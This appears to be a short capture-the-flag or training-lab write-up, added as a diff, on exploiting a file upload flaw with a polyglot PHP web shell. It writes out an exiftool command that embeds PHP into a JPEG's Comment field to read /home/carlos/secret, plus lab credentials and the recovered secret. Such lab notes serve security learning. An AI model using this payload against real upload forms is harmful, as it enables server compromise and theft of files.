@@ -1,0 +1,16 @@
+Remote code execution via polyglot web shell upload
+Goal: Exploit file upload vulnerability to exfiltrate the contents of the /home/carlos/secret file.
+wiener:peter
+
+1)
+-login
+-upload an image
+-upload a shell
+-> Not a valid image
+
+2)
+-exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" cat.jpg -o polyglot.php
+-https://rcenetsec.com/hide-malicious-shell-in-image-file/
+-upload
+-View get request in burp
+->START skPbSllImrFBcXPsuDpsEfLxPaoXqIwg END
